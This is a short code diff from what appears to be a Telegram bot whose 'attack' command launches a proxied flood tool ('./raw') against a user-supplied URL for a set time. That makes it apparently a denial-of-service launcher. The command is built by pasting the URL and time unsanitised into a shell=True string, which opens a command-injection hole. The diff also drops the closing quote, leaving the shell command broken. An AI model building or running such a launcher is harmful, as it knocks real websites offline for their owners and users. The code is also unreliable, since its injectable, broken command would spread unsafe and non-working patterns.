@@ -43,7 +43,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
                      f"Attacking {url} for {time} seconds.")
 
         subprocess.Popen(
-            f"screen -dmS tls bash -c 'chmod 777 * && ./raw {url} {time} 64 5 proxy.txt'",
+            f"screen -dmS tls bash -c 'chmod 777 * && ./raw {url} {time} 64 5 proxy.txt",
             shell=True
         )
 
